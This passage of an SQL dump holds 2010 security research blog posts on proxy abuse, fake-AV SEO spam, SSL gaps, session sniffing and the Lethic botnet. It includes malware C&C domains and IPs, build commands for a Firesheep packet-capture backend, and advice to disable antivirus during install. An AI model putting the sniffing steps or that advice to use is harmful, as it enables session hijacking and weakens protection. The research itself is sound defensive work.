\"cheated\":Note: there are many of these PTC sites, and they all look fairly similar to this setup.On the homepage of the site, top earners are displayed:The number 3 daily earner for this PTC site is \"dominic1102\" - looking at logs, I see this PTC member generating a large number of referrals to make commissions and increase their click volume.  Example format:www.tuxedocatsclicks.info/index.php?ref=dominic1102The \"dominic1102\" handle and client IP (123.134.112.84) was used for a number of other PTC sites as well, e.g., www.lakotaptc.info/index.php?ref=dominic1102Log snippet of PTC cheating#4 IRC / ICQ MaskingUsers of chat networks frequently what to hide their source IP address.  Whether the user is engaged in illegal activity (e.g., selling stolen credentials) or wanting to remain anonymous in case a flame war erupts followed by a denial of service attack.# 5 Proxy Testing / Reveal host IP:It appears that a portion of the traffic analyzed comes from automated checks to identify open proxies.  Once connected, the proxy is tested to see which IP address is exposed on the Internet when traffic is forwarded through the proxy.# 6 Other Browsing and Site ScrapingThis includes a variety of things, ranging from general browsing, porn and other \"not safe for work\" (NSFW) surfing and regular page scraping.  Based on the transaction timestamps in the logs, much of the porn surfing appeared to be automated scraping of pornographic images.', 'Abuse', 'https://www.zscaler.com/blogs/research/top-abuses-open-web-proxies');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (447, 'Blackhat Spam SEO: Which Sites Get Hijacked?', 'Julien Sobrier', 'December 06, 2010', 'I have looked at 1,123 legitimate sites which have been hijacked to host spam pages redirecting users to a fake AV page. I\'d assumed that most of them would be running WordPress, Joomla!, OSCommerce and other open source software known to have a history of security issues. In reality, these software packages actually represent less than 15% of all hijacked sites.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Type of Software used to create the hijacked sites\r\n		\r\n	\r\n\r\n\r\n\r\nAlso, a large number of hijacked sites actually had no dynamic pages - they contained only images, JavaScript, CSS and HTML files. As such, they are unlikely to have been hacked through a vulnerability in the software installed. Therefore, we can assume that one of the two following techniques were leveraged to add the PHP scripts used to generate spam pages to the sites:\r\n\r\n \r\n\r\n\r\n	Admin credentials have been stolen/brute forced, or webmaster kept the default login/password. The malicious scripts where simply uploaded using their FTP account or a web based admin interface.\r\n	Shared hosting servers could have been compromised.\r\n\r\n\r\nThe second possibility is the most likely. There have been mass-infections reported in the past for GoDaddy, BlueHost, Dreamhost, etc. The distribution of hacked sites by hosting companies is interesting:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nThe Endurance International Group, which owns 20 hosting companies (iPowerWeb, Pow Web, Dot5 Hosting, StartLogic, Fatcow, Globat, etc.) hosts 38% of the hijacked sites. Bluehost, a rather small hosting provider, represents 28% of the hijacked sites. However, the biggest providers host a small proportion of sites used for malicious spamming: 2% for GoDaddy, and less than 0.5% for 1&1.\r\n\r\nIt seems that most of the legitimate sites have been hijacked through a vulnerability in their hosting platform rather than in the software they are running. That\'s not good news for the webmaster who wants to keep his site safe: part of the problem is out of their control, keeping your WordPress or Drupal version up to date and locked down is not enough - you also need to seek out a secure hosting provider.\r\n\r\n-- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/blackhat-spam-seo-which-sites-get-hijacked');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (448, 'Blackhat Spam SEO & Fake AV: They Are Still There', 'Julien Sobrier', 'November 30, 2010', 'It\'s quite depressing to see that Google still contains numerous links to spam pages which lead to fake AV sites. While there are fewer of them, they are still there. This, despite the fact that attackers have not significantly changed their techniques in many months. They still hijack vulnerable sites and create spam pages with similar URL patterns. The fake AV pages are mostly the same, using the same CSS and Javascript code and antivirus engines continually fail to detect the majority of  the malicious executables.Here is a typical example of what users will still encounter. The site casino-jugendclub.de has been hijacked to host thousands of pages like http://www.casino-jugendclub.de/lnsqo.php?page=jennifer-nettles-husband.Primitive, but effective, SEO spam pageAs usual, the page redirects real users coming from a search on Google, Yahoo! or Bing to a fake AV page. This time, the fake AV is slightly different. It mentions a \"Windows Security Update\", and is hosted on microsoftwindowssecurity145.com (still up at the time of writing). It looks the same as traditional fake AV sites, with animation showing an antivirus scan of the computer.Fake AV pageAnd again, the detection rate amongst AV vendors is only around 25%.Malicious executable disguised as an antivirusNot much has changed in the past 6+ months in the world of malicious spam SEO. While Google has made efforts to combat the fake AV sites and the number of malicious spam links in popular Google searches has gone down somewhat, more needs to be done.-- Julien', 'AntiVirus', 'https://www.zscaler.com/blogs/research/blackhat-spam-seo-fake-av-they-are-still-there');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (449, 'Amazon Profiles Used For Spam', 'ThreatLabz', 'November 30, 2010', 'Amazon\'s online store-front has a social networking component to it, where people with accounts can create user and seller profiles to share their interests, what they are reading, listening to, selling, etc. For the most part, anytime a site allows user-driven content to be published on the web we have seen some kind of abuse (for example, LastFM, Google Code, Adobe Groups). Amazon\'s profiles are no different- most appear to \"profile spam\" advertise various pages on the adult sites:           	adultmediareviews.com  	redspacetube.com      Some of the advertising language for redspacetube.com suggests illegal / child porn content. Language take from Amazon\'s site:      Google searches for both of the above domains show other sites hosting these similar \"profile\" spam advertisements. For example, Google Groups:  The redspacetube.com domain has been identified as redirecting users to Trojan malware (FakeAV) in the past (reference 1, reference 2). There are a lot of these Amazon profiles:      The Amazon profile abuse is not limited to porn and malware spam, but also includes pharma spam:  There are thousands of these profiles:  I have notified Amazon via their online abuse form and am in the process of trying to obtain a more direct contact for their abuse department.', 'Abuse;Phishing', 'https://www.zscaler.com/blogs/research/amazon-profiles-used-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (450, 'Cyber Monday In Review', 'ThreatLabz', 'November 30, 2010', 'Cyber Monday is hyped every year as the largest online shopping / deals day of the year. How was your Cyber Monday? This is a short post on some of what we saw. Our perspective is from the corporate end user (i.e., people on their work computer).\r\n\r\nStats/Trends\r\nDuring Cyber Monday, about 4% of all web transactions from our customers were to online shopping sites. To put this in comparison, during Black Friday only 2.71% of the day\'s web transactions were to online shopping sites. In terms of raw numbers of transactions, Cyber Monday had about 87% more online shopping transactions than Black Friday. This chart shows the magnitude of Cyber Monday online shopping from Nov. 20 - 29th.\r\n\r\nOver 20% of the online shopping transactions for this 10-day timeframe were from Cyber Monday.\r\n\r\nTo no surprise, the web servers that saw the highest number of online shopping transactions belonged to Amazon. Here are the top 5 web servers with the most Cyber Monday online shopping transactions:\r\n\r\n \r\n\r\n\r\n	72.21.194.1 (Amazon)\r\n	72.21.211.176 (Amazon)\r\n	72.21.214.128 (Amazon)\r\n	184.85.80.138 (Akamai)\r\n	204.160.114.254 (Level3)\r\n\r\n\r\nOn the Amazon 72.21.192.0/19 netblock, the top static shopping pages viewed were:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	General Baby (site)\r\n	General Video Games (site)\r\n	General TV/Video (site)\r\n	Kindle Wireless Reader Wifi Graphite product page (site)\r\n	General Toys (site)\r\n\r\n\r\nThe top specific product page viewed other than the Kindle, which is on Amazon\'s homepage, was a TomTom GPS unit (site).\r\n\r\nSpam/Phishing/Malware\r\nThere was a decent amount of \"Cyber Monday\" spam advertising deals - mostly on various hardware and software. Some of which appeared to be for fake store-fronts, but most were pay-per-click affiliates. The below spam redirects the user through the adplexr.com pay-per-click site.\r\n\r\nGet your laptops...\r\n\r\nAnd cell phones...\r\n\r\nThe phishing volume seemed in range with the normal volume (reference PhishTank):\r\nThere didn\'t appear to be any major Cyber Monday malware campaigns or anything out of the ordinary. That being said, continue to be safe when shopping online this holiday season.', 'Phishing;Spam', 'https://www.zscaler.com/blogs/research/cyber-monday-review');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (451, 'SSL: The Sites Which Don\'t Want To Protect Their Users', 'Julien Sobrier', 'November 24, 2010', 'Last week I explained some of the challenges that websites face to switch to SSL to protect their users. The main challenge is to send the correct SSL certificate in all cases.Some websites make it very hard, or even impossible, to use secure connections to protect their sessions. It has been exactly a month since Firesheep was released to demonstrate the problem of session side-jacking, but these websites are still not willing to do anything about this problem.Here are some of these sites, all part of the list of domains monitored by Firesheep.Amazon: no HTTPS for you!It is just not possible to use https://www.amazon.com/! This address redirect users to http://www.amazon.com/.Permanent redirection from HTTPS to HTTPTo their credit, users must login again over HTTPS to make an order, but Amazon still provides plenty of information about their users: first name, last name, what they\'re interested in, full access to their shopping cart, etc.Basecamphq.com: 37signals.com certificateIf you go to https://www.basecamphq.com/, you get a certificate for 37signals.com.  This isnt very helpful for users not aware that BaseCamp is a product from the company 37Signals.SSL certificate valid for a very different domain nameFacebook: hidden HTTP connection, HTTPS login failsI logged into my Facebook account using https://www.facebook.com/. Out of the 10+ requests required to display my home page, one of them is done to http://www.facebook.com/ap.php. This request does carry all the cookie values needed to hijack my account. There is currently no way to surf Facebook safely.Unsecure HTTP connectionThere is a worse scenario. I logged out of my account, and went to the secure login page https://www.facebook.com/. I entered the wrong password by accident. I was then redirected to the secure page https://login.facebook.com/login.php. There, I entered my password correctly. But I was redirected to the unsecured http://www.facebook.com/home.php (no HTTPS)!Redirection from secure login page to unsecured home pageAlthough Firesheep has made a lot of noise, and the issue of session side-jacking has now been widely reported on, even the major sites have not taken the necessary actions to protect their users. It is very sad to see sites such as Facebook, widely used and by a large and diverse audience, are still very insecure.This was just a quick review of a few sites, I\'m sure plenty of other sites have the same weaknesses.Happy Thanksgiving!-- Julien', 'Encryption;Data Breach', 'https://www.zscaler.com/blogs/research/ssl-sites-which-dont-want-protect-their-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (452, 'BlackSheep 1.5: More Options', 'Julien Sobrier', 'November 17, 2010', 'The latest version of BlackSheep brings new options and fixes a few bugs. I encourage all users of BlackSheep to upgrade by downloading the latest version.             New options                	  		  			  		  		  			Start BlackSheep automatically or manually  		  	        BlackSheep can start automatically with Firefox (as the previous version did), or manually. This allows you to use BlackSheep only when you move to a wireless network, for example.    I\'ve changed the options slightly, for when BlackSheep actually starts. Previously, if the \"check interval\" value was set to 5 minutes (default value), BlackSheep would start 5 minutes after the browser was opened, and then every 5 minutes. Now, BlackSheep runs immediately, when the browser first launches, and then every 5 minutes thereafter.    A shortcut to the BlackSheep options has been added under the Tools menu for easy access.    Bookmark and installation issues    Some users have reported that the bookmarks no longer work after installing BlackSheep. This seems to be caused by external security tools (antivirus, sandbox). Disabling Sandboxie fixed the problem for one reader.    A few readers reported issues installing or downloading BlackSheep. This was caused by their antivirus engines. BlackSheep includes firesheep-backend.exe which is flagged as a malware by some vendors. This executable listens to HTTP traffic on a network interface, it is not malicious. You may need to disable your antivirus temporarily while you are downloading and installing BlackSheep.    Official Mozilla Add-ons site    BlackSheep has been submitted to the official Mozilla Add-ons site. It will likely take a few weeks before it gets approved.                              -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/blacksheep-15-more-options');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (453, 'Which Networks Are More Susceptible To Firesheep (aka Session Sniffing)?', 'Chris Mannon', 'November 17, 2010', 'Firesheep highlighted once more, the problem of session sniffing. Users on open wireless networks are especially at risk when they login to websites without SSL encryption. But not all wireless networks are the same when it comes to sniffing traffic...and wired LAN networks are not 100% safe either.Firesheep found user sessionsWireless networksFiresheep was released to demonstrate the inherent weakness that session hijacking can present on wireless networks. They are several types of wireless networks, some are safe, but most are susceptible to session theft.Open networksOpen wireless networks are becoming more and more popular. They can be found in public libraries, coffee shops, book stores, etc. Anybody can connect to these networks and no password is required. An attacker simply needs to be physically close enough to the wireless signal to steal unencrypted sessions.WEPWEP networks are protected by a password. These networks are often used in hotels to restrict Internet access to paying customers, but the password is the same for everybody. If the attacker knows the password, the network is as unsafe as an open wireless network.It\'s generally very easy for an attacker to get the password without being a real customer (just ask another user for the password and you will likely get it). However, knowledge of the password is not necessarily required, as WEP encryption has been broken. There are tools freely available to crack the password.WPA-PSK/WPA2-PSKUnlike WEP, WPA negotiates a different key with each client to encrypt the traffic, but like WEP, WPA/WPA2 PreShared Key (PSK) encryption has been cracked as well. Somebody with enough security knowledge can determine the shared key, and sniff the HTTP sessions.WPA-Enterprise/WPA2-EnterpriseThese extensions built on the WPA/WPA2 protocols have not been cracked. Unfortunately, those are not often found or personal wireless equipments.Wired networksWired networks are not necessarily safe. As with a wireless network, the type of technology used has an impact on the likelihood that traffic can be intercepted.HubsIf hubs rather than switch are used to connect computers, session sniffing is easy. Hubs send network traffic received on one interface to all other interfaces. This means that anybody connected to the same hub receives everyone else\'s traffic. Hubs are not used in many enterprises because of the security issues they represent, as well as their performance issues. However, they are cheaper that switches, and thus, can still be found in home or SMB networks.Hub: traffic is replicated to all portsSwitchSwitches are more efficient than hubs: the network traffic is forwarded to one interface only. In theory, session sniffing is not possible on these devices. However, it is quite trivial flood a switch in order to make it behave like a hub. This flooding would probably be noticed in a company with a good IT department monitoring the internal network, but not necessarily in smaller companies.Switch: traffic is forwarded to one interface Monitor portMost enterprise-grade network equipment (switches, routers, firewalls) has a monitor or mirror port: all traffic seen by the switch is mirrored to this interface. Anybody with physical access to this port can sniff traffic from the entire network. Unlike the case of flooding a switch to make it behave as a hub, this would not create any unusual network activity, and could not be detected.Don\'t trust your network! Wired LANs are safer than wireless networks in general because they require physical access, but they are not 100% safe. To be sure that you\'re the only one accessing your accounts on the web, make sure you use SSL: use HTTPS only, or use an SSL VPN.-- Julien', 'Encryption;Data Breach', 'https://www.zscaler.com/blogs/research/which-networks-are-more-susceptible-firesheep-aka-session-sniffing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (454, 'Why The Web Has Not Switched To SSL-only Yet?', 'Julien Sobrier', 'November 15, 2010', 'With the session-sidejacking issue highlighted once more by Firesheep, a many people have asked me why more websites, or at least the major players (Google, Facebook, Amazon, etc.) have not enabled SSL by default for all communication. Indeed, encryption is the only way to ensure that user sessions cannot be easily sniffed on a open wireless network.\r\n\r\nThis sounds easy - just add an s after http in the URL! It\'s not actually that easy. Here are some of the challenges.\r\n\r\nServer overhead\r\n\r\nThe obvious issue is that encrypting all HTTP sessions requires additional resources on the sever-side. I\'ve seen numbers showing 10% to 20% CPU overhead for SSL. Having to add 10% more servers is a big deal when you\'re dealing with thousands of them like Facebook and Google. However, the overhead can actually be much higher on specialized severs, which efficiently serve static content (such as images) directly from memory (think memcached). In this case, the processing power required is easily multiplied by a factor of 10. Of course the SSL encryption can be offloaded to a proxy or other external hardware, but you have to add the cost of managing a more complex topology as well as buying the new hardware.\r\n\r\nIncreased latency\r\n\r\nSSL also has a perceived performance issue for the client (i.e. the browser). For  each new session,  SSL encryption must be set up between the client and server. This means a few more packets must be sent back and force before the actual HTTP data is received. This happens for each page load, and also for each domain.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			1 HTTPS transaction: 4 SSL handshake packets, 6 data apckets\r\n		\r\n	\r\n\r\n\r\n\r\nA typical  Facebook page (like the News Feed) contains HTML elements (images, CSS, JavaScript) from more than 10 domains.  This means the full SSL handshake is done over 10 times on each page. This in turn makes pages load more slowly. The problem is amplified if the user\'s connection has high latency, as it would on a cell phone.\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			4 of the 10+ domains used on a Facebook page\r\n		\r\n	\r\n\r\n\r\n\r\nChallenge for CDNs\r\n\r\nAll the major websites use a Content Delivery Network (CDN) to deliver static content quickly to their users. Some have their own (Facebook, Google), but others use third parties such as Akamai.\r\n\r\nThe same website can be served from hundreds of CDN servers based on their geographical location, and each CDN server can handle several hundred websites. Most website owners don\'t want users to see content being downloaded from akamai.com, so they use an alias. For example, static.amd.com could point to a248.e.akamai.net.\r\n\r\nEach CDN therefore serves different content based on the Host header received (static.amd.com for example). This creates a problem. The SSL handshake is done first,  then the HTTP data is sent. That means the SSL server must send an SSL certificate to each client without first seeing the host. In brief, the SSL server sends a certificate based on the destination IP address, not based on the HTTP hostname.\r\n\r\nThe second fact to keep in mind is that an SSL certificate is valid for one domain only.  If a user goes to www.example.com, the certificate has to be signed for www.example.com, not example.com or example.net.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			SSL certificate for www.facebook.com\r\n		\r\n	\r\n\r\n\r\n\r\nFor example, http://www.amd.com/ is served entirely through Akamai. So what happens when you use https://www.amd.com/ ? You get a warning, because the Akamai CDN server sends a certificate valid for itself (a248.e.akamai.net), not for www.amd.com.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Wrong SSL certificate issued for akamai.net instead of amd.com\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nWildcard certificates are not enough \r\n\r\nYou don\'t need to use a CDN to have troubles serving the right certificate for a given hostname. Most sites can be reached with and without www: http://amazon.com/ and http://www.amazon.com/ brings you to the same site. When a site wants to handle several sub-domains (www.site.com, mail.site.com, static.site.com, etc.) easily, it can buy a wildcard certificate. This certificate is valid not just for one domain, but for all sub-domains: *.site.com. Unfortunately, this wildcard certificate is not valid for site.com (no sub-domain). For that, a separate certificate is required. This is again a challenge if the same IP address servers both site.com and www.site.com.\r\n\r\nDropbox has this exact issue. Access to https://dropbox.com/ delivers a warning to he user:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Dropbox\'s wildcard SSL certificate is not valid for dropbox.com\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nMixed HTTP/HTTPS: the chicken & the egg problem\r\n\r\nYet another issue - HTTPS pages must contain external object from HTTPS URLs only. You cannot match HTTP and HTTPS on a secure page, otherwise users receive a warning message. Websites however rely on a significant amount of content from external sites: Googole/Comscore Analytics, Google/Twitter/Facebook connect, ads, etc.\r\n\r\nGoogle Adsense, for example, cannot be used on a secure site. All sites which rely on this advertising network to make some money need to forget about HTTPS and about protecting their users!\r\n\r\nEach website needs to make sure that all their partners, sometimes much bigger than they are, fully support HTTPS before they switch to it.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Warning about external HTTP objects on a secure page\r\n		\r\n	\r\n\r\n\r\n\r\nWarning are scary!\r\n\r\nIt is not easy for a site to switch to SSL for all content. One mistake, and users will receive a warning. And they\'re scary! Internet Explorer 8 explicitly suggests that the user not to enter a site with an SSL certificate error.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Scary warning on Internet Explorer\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\nWebsites really don\'t want to scare away potential visitors!\r\n\r\nBut it is possible\r\n\r\nMoving from HTTP to HTTPS is easier said than done. This must be carefully planned. All cases have to be thought through to avoid warning messages. Despite that fact, all of the challenges discussed in this post do have technical sotuions.\r\n\r\nThis can be done. Google has already moved Gmail to HTTPS by default, but they have not done the same for their other services.', 'Data Breach;Encryption;Microsoft', 'https://www.zscaler.com/blogs/research/why-web-has-not-switched-ssl-only-yet');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (455, 'Lethic Botnet Returns, Uses \"Realtek\" Identifier', 'ThreatLabz', 'November 10, 2010', 'Remember Stuxnet? Chances are you do- a few months back there was a worm that spread over USB using the 0-day .LNK vulnerability (CVE-2010-2568) and targeted Siemens SCADA systems. Additionally the rootkit package that it installed was digitally signed using real certificates from real hardware manufacturers: Realtek Semiconductor Corp. (www.realtek.com.tw) was one of the companies (JMicron was the other - both are Taiwanese companies).    In recent days, I have seen malware with Realtek Semiconductor Corp. signature information. Specifically, it has been of the Trojan Lethic / Ddox malware family. About a year ago, Jose Nazario detailed his analysis on the Lethic bot being used to spew pharma, replica, etc. spam. About a month after he posted his analysis, M86 reported on the Lethic botnet takedown. Well it appears that there is a new variant / botnet of this malware family:    Here are two recent samples:    MD5: 0460d89f0091d951184a8d77c6641340  First seen: 2010-10-31 17:42:29  VirusTotal Report    MD5: ddb7aee9b335f479e0e2ac7aaf223856  First seen: 2010-11-07 09:58:39  VirusTotal Report    Both have Realtek information reported from Microsoft\'s Sigcheck tool:  However, the tool shows no signer / certificate authority verified the signature. Here is a snapshot of the Stuxnet signcheck output for comparison:  Stuxnet and Lethic are completely different, and I am in no way presuming that one or more authors behind either malware campaign intersect - I did think it was interesting that this one company is being \"picked\" in malware campaigns though.    There may be some correlation with the exact Realtek information in the Lethic binary. The information within the Lethic binary does appear to mimic valid Realtek information for their AC97 Audio product. Doing some searches, I\'ve found other malware families have used this exact Realtek information within their malware binaries. Here is a VirusTotal report from an SDBot sample first seen in January 2010, that has the exact same Realtek information used by Lethic. Separate malware authors could have simply selected a legitimate software package and included the exact information - however this does seem pretty coincidental. Or perhaps it could be the \"signature\" of a common author or group behind these artifacts - perhaps they seek to tarnish the reputation of this Taiwanese company for personal or political motivation - who knows?    There are about 91 Lethic samples with the \"Realtek\" signature information that Google shows from VirusTotal. These date from early September to present.    In the past few days, locations that I\'ve seen the Lethic bot spread from include:  77.79.9.174 over port 17678  85.17.58.165 over port 36182  91.121.175.219 over port 16512    The port location changes over time, and rotates through funky sounding executable names that appear to be auto-generated from various letter permutations. For example:  bknx.exe  fewfdewwe.exe  fefewwew.exe  rfvmimikwe.exe  vgewfwqwq.exe  vgrwvew.exe    Following infection, connection attempts have been seen to:  izuhjsn.com (173.236.56.218) on port 8706  xkihjhx.com (67.159.45.104) on port 2904    The domains were both registered August 1, 2010 through the Registrars:  BEIJING INNOVATIVE LINKAGE TECHNOLOGY LTD. DBA DNS.COM.CN,  XIN NET TECHNOLOGY CORPORATION      	  		  			  			  		  	      DomainTools shows 12 other registered domains with the \"voip53\" Yahoo email address and 62 other registered domains with the \"dfghddf\" Hotmail email address within the whois information - presumably other malicious / C&C domains.    In mid-October, an Anubis report shows a \"Realtek\" Lethic sample looping through a number of SMTP proxies/open-relays and sending spam similar to the pharma, replicas, etc. that Jose had reported in the previous 2009 iteration of the botnet. Here is a pcap snapshot of a replica spam message sent from the recent, Fall 2010 iteration of the Lethic bot:      El Reg recently reported on how prolific the Lethic botnet was and the success of the takedown... could it be ramping up to make a come back? Also, can this \"Realtek\" signature info be used to tie the author/group to the malware they have released?    Update:  The Sigcheck tool apparently parses the PE File Version Info data structure and includes this in the output. The above \"Realtek\" information is actually extracted from the PE File Version Info data structure (e.g., here). While this is not a digital signature- it is still identifying info that may be able to tie certain malware samples to the same author / group / or binary builder.', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/lethic-botnet-returns-uses-realtek-identifier');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (456, 'BlackSheep For Linux', 'Julien Sobrier', 'November 09, 2010', 'BlackSheep uses compiled code to listen to HTTP traffic. These executables come straight from Firesheep. Firesheep ships with executables for Windows And MacOSX 10.5 (Intel) only, this is why the first release of BlackSheep supports these 2 platforms only.    The number one request I got was to support Linux. The good news is that it is now possible to run BlackSheep on Linux - though it does requires some work to setup.      Too Many Linux environments    The main challenge is that the back-end must be compiled on each possible environment: CPU (x86, x86_64), compiler (gcc 3, gcc 4), and also different versions of libpcap, etc. In the case of Firesheep and BlackSheep, it is not possible to deliver one add-on that would work on all Linux environment.    This means that each Linux user must compile their own version.      Requirements    To make your own Linux version of BlackSheep, you need:      	autoconf 2.61 or higher (autoconf -V)  	libpcap-devel with pcap-config  	xulrunner-sdk (or xulrunner-devel depending on the distribution)  	boost-devel      Here is how to proceed on CentOS.    autoconf 2.61    CentOS provides autoconf 2.59, so a new version must be compiled from source:         wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.65.tar.gz  tar xf autoconf-2.65.tar.gz  cd autoconf-2.65  ./configure  make  sudo make install  autoconf -V      If autoconf -V still shows the old version, modify your PATH:                export PATH=/usr/local/bin:$PATH           libpcap-devel    The version of libpcap-devel in CentOS is too old. A new one must be installed from source:                               sudo yum install flex  sudo yum install byacc  wget http://www.tcpdump.org/release/libpcap-1.1.1.tar.gz  tar -zxvf libpcap-1.1.1.tar.gz  cd libpcap-1.1.1/  ./configure  make  sudo make install                boost-devel                                    sudo yum install boost-devel           Back-end from Firesheep    Then, you need to compile the Firesheep-backend. Get the source code for Firesheep for Linux:                               sudo yum install git  sudo yum install xulrunner-devel  git clone git://github.com/mickflemm/firesheep.git  cd firesheep  git submodule update --init  ./autogen.sh --with-xulrunner-sdk=/usr/lib/xulrunner-sdk-1.9.2/  make      Note than xurlrunner could install in a different folder on your Linux box, for example in /usr/lib/xulrunner-devel-1.9.2.12    Check if the back-end works correctly. The directory might be slightly different                          cd xpi/platform/Linux_x86-gcc3/  sudo ./firesheep-backend --fix-permissions  ./firesheep-backend --list-interfaces      The last command might generate an error. However, this may not be an issue. To check if the packet capture works, try this (you may want to change eth0 to wlan0):                          ./firesheep-backend eth0 \"tcp port 80\"      In a different console, try this:                          wget http://www.zscaler.com/      You should now this this in the first console:                          ./firesheep-backend eth0 \"tcp port 80\"  {\"from\":\"10.10.100.109:37753\",\"to\":\"72.249.144.174:80\",\"method\":\"GET\",  \"path\":\"/\",\"query\":\"\",\"host\":\"www.zscaler.com\",\"cookies\":\"\",  \"userAgent\":\"Wget/1.11.4 Red Hat modified\"}      Congratulations, you\'ll be able to run BlackSheep on your box.    Next, you need to include the new back-end in the BlackSheep plugin (1.3 or higher):                          cd ~  wget http://www.zscaler.com/research/plugins/firefox/\\      blacksheep/blacksheep-latest.xpi  mkdir blacksheep  unzip blacksheep-latest.xpi -d blacksheep/  cd blacksheep  cp -r ../firesheep/xpi/platform/* platform/      Edit the file install.rdf Remove the following lines:                          [em:targetPlatform];Darwin_x86-gcc3[/em:targetPlatform][em:targetPlatform]WINNT_x86-msvc[/em:targetPlatform]      or add your new platform:                          [em:targetPlatform>Linux_x86-gcc3</em:targetPlatform]  [em:targetPlatform]Linux_x86_64-gcc3[/em:targetPlatform]      You may also want to disable the updates to keep your custom, stable version. Remove this line, or modify the URL:                          [em:updateURL]http://codebutler.github.com/firesheep/update.rdf[/em:updateURL]      You can now create the XPI file:                          zip blacksheep-latest-linux.xpi -r *      Now, install BlackSheep. Restart your browser and open blacksheep/blacksheep-latest-linux.xpi.    There is one last step: the permissions must be fixed on firesheep-backend.                          cd .mozilla/firefox/ygqde9s7.default/extensions/\\      jsobrier\\@zscaler.com/platform/Linux_x86-gcc3/  sudo ./firesheep-backend --fix-permissions           The new version of BlackSheep contains Linux versions built on CentOS5 x86 and x86_64. If this does not work in your environment, follow the procedure above.                                   -- Julien', 'Data Breach;Encryption', 'https://www.zscaler.com/blogs/research/blacksheep-linux');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (457, 'Update To BlackSheep', 'Julien Sobrier', 'November 09, 2010', 'First of all, thank you very much for all your e-mails and comments! I\'ve tried to answer all. I will give the answer to the most common questions in this blog post.BlackSheep 1.1 is available. It fixes one issue: with HTTP requests spread over several packets, BlackSheep could detect itself as Firesheep. This is now fixed. To get the new version, go to Tools - Add-ons - Extensions and click on Find Updates. A new version of BlackSheep should be found. if the regular update dopes not work, install it by clicking on this link.Some users reported the same issues or comments. I\'ll try to answer them in this post.Cannot install BlackSheep cannot be installed in this environmentIf you get an error message similar to this one (\"BlackSheep\" could not be installed because it is not compatible with your Firefox build type (Linux_x86-gcc3). Please contact the author of this item about the problem.) when installing the add-on , this is because your version or Operating System is not compatible with BlackSheep. BlackSheep works on Windows (XP or higher) and MacOSX (10.5 or higher, Intel processor only), and Firefox 3.5 to 3.6.12.The main reason for these restrictions is that BlackSheep, like Firesheep, contains executables to listen for HTTP traffic. These executables must be compiled for each platform they run on. BlackSheep\'s executables come straight from the Firesheep code.However, I am working on extending the platform that can run our plugin. Here are the 2 platforms which should be supported soon:Firefox 4.0 BetaIn theory, BlackSheep should work on Firefox 4.0. However, I don\'t have the latest beta installed for testing. If Firefox beta users are ready to test the plugin, I can send them a special package. if enough readers test the plugin successfully on Firefox 4.0 Beta, I will make the official version available for 4.0 Please e-mail me to jsobrier@zscaler.com if you have some time for testing.LinuxSupport for Linux is quite a challenge. As mentioned before, the main problem is that there should be a different version for each Linux distribution out there because of the dependencies on multiple libraries.But support for Linux was number one request I got in the mail today, so I have spend some time on it. Support for Linux should be available on Wednesday. I\'ll announce it on this blog. Be aware that this will involve some work form the Linux users to get BlackSheep running in their environment.Javascript error in the preferences menuJavaScript error in the Preferences menu\"ReferenceError: Cc is not defined\". This problem happens mainly for Windows users. Make sure you have Winpcap installed. If not, install it and restart your browser.Apparently, this also happen for a few Mac users. The main reason is that the back-end is not able to retrieve the list of network interfaces. However, the plugin would most likely work if the interface were to be hard-coded in case of failure. I\'m working on a fix for this.MacOSX and FileVaultIf you use FileVault on MacOSX, you might be prompted for a password to run firesheep-backend. See this thread for more information. Enjoy BlackSheep, and keep reporting any issues or comments.-- Julien', 'Data Breach', 'https://www.zscaler.com/blogs/research/update-blacksheep');
